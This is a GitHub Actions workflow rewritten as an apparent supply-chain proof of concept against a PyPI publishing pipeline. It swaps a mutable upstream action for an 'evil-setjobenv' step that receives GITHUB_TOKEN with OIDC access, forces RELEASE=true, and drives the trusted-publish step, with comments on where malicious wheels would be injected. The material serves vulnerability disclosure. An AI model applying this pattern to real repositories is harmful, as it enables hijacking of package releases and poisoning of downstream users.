
name: build - check - upload

on:
  push:
    branches:
    - main
  release:
    types: [published]
  pull_request:
    branches:
    - '**'
  workflow_dispatch:
    inputs:
      poc_note:
        description: 'Security PoC trigger — simulates release context'
        required: false
        default: 'CVE candidate: setjobenv@main supply chain PoC'

concurrency:
  group: ${{ github.ref }}-${{ github.workflow }}-${{ github.event_name }}-${{ (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/heads/release/') || startsWith(github.ref, 'refs/heads/long_ived/')) && github.sha || '' }}
  cancel-in-progress: true

permissions:
  contents: read
  id-token: write

jobs:
  ## ----------------------------------------------------------
  ## build-wheels — stripped to single job, no heavy build
  ## Only purpose here is to satisfy artifact expectations
  ## ----------------------------------------------------------
  build-wheels:
    name: Wheel - Ubuntu 3.12 Intel
    runs-on: ubuntu-latest
    continue-on-error: true
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        fetch-depth: 0
    - name: Create dummy artifact (PoC — no real build)
      run: |
        mkdir -p dist
        echo "poc-placeholder" > dist/chiapos-0.0.0-poc.whl
    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: packages-Ubuntu-3.12-Intel
        path: ./dist

  ## ----------------------------------------------------------
  ## build-sdist — no-op, just satisfies needs: if restored
  ## ----------------------------------------------------------
  build-sdist:
    name: sdist - Ubuntu 3.12 Intel
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    - name: Create dummy sdist (PoC)
      run: |
        mkdir -p dist
        echo "poc-sdist-placeholder" > dist/chiapos-0.0.0.tar.gz
    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: packages-sdist-Ubuntu-3.12-Intel
        path: ./dist

  ## ----------------------------------------------------------
  ## check — no-op, just satisfies needs: if restored
  ## ----------------------------------------------------------
  check:
    name: Check - Ubuntu 3.12 Intel
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    - name: PoC check placeholder
      run: echo "check step — no-op for PoC"

  ## ----------------------------------------------------------
  ## upload — POC MODIFIED
  ## needs: REMOVED so this runs immediately on workflow_dispatch
  ## setjobenv@main replaced with evil-setjobenv
  ## ----------------------------------------------------------
  upload:
    name: Upload to PyPI - Ubuntu 3.12 Intel
    runs-on: ubuntu-latest
    ## needs: block intentionally removed for PoC speed
    ## In production this is: needs: [build-wheels, build-sdist, check]

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        fetch-depth: 0

    ## --------------------------------------------------------
    ## POC SUBSTITUTION
    ## Original vulnerable line:
    ##   uses: Chia-Network/actions/setjobenv@main
    ##   env:
    ##     GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    ##
    ## A compromised setjobenv@main would execute here with full
    ## access to GITHUB_TOKEN and the OIDC token endpoint,
    ## immediately before pypa/gh-action-pypi-publish runs.
    ## --------------------------------------------------------
    - name: Set Env (POC - simulates compromised setjobenv@main)
      uses: ./.github/actions/evil-setjobenv
      with:
        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

    ## Force RELEASE=true — in production setjobenv sets this
    ## based on the git ref being a release tag
    - name: '[PoC] Force RELEASE env to reach publish step'
      shell: bash
      run: |
        echo "RELEASE=true" >> $GITHUB_ENV
        echo "PRE_RELEASE=false" >> $GITHUB_ENV
        echo "[PoC] RELEASE=true forced — publish step condition will pass"
        echo "[PoC] In production, setjobenv@main sets this based on release tag"

    - name: Download artifacts
      uses: actions/download-artifact@v4
      with:
        merge-multiple: true
        pattern: packages-*
        path: ./dist
      continue-on-error: true

    - name: '[PoC] Show dist contents before publish'
      run: |
        echo "=== dist/ contents staged for PyPI publish ==="
        ls -la ./dist/ 2>/dev/null || echo "(empty — build-wheels skipped)"
        echo "=== In a real attack, malicious wheels would be injected here ==="

    ## This step is reached (RELEASE=true) but FAILS because
    ## this fork has no trusted publisher configured with PyPI.
    ## Expected failure — proves the publish step is reachable
    ## from the compromised setjobenv position.
    - name: Publish distribution to PyPI
      if: env.RELEASE == 'true'
      uses: pypa/gh-action-pypi-publish@release/v1
      with:
        packages-dir: dist/
        skip-existing: true
